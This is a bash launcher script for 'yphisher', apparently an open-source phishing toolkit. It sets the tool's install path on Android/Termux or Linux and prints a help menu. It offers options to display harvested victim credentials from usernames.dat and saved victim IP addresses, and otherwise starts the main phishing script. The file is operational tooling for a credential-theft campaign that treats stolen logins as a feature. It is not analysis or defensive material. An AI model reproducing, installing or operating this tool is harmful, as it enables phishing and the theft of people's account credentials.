#!/bin/bash

# https://github.com/htr-tech/yphisher

if [[ $(uname -o) == *'Android'* ]];then
	YPHISHER_ROOT="/data/data/com.termux/files/usr/opt/yphisher"
else
	export YPHISHER_ROOT="/opt/yphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Yphisher type \`yphisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $YPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $YPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $YPHISHER_ROOT
	bash ./yphisher.sh
fi
